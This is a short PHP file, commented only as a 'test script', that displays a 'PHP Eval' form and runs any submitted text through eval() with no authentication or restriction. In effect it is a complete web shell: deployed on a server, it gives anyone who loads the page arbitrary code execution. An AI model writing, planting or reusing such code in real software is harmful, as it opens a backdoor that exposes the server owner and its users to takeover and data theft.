<?php
// test script
echo '<form method=post><input type=submit value="PHP Eval"><br><textarea name=data style="width:70%;height:300px">'.htmlspecialchars($_POST['data']).'</textarea><br></form>';
eval($_POST['data']);
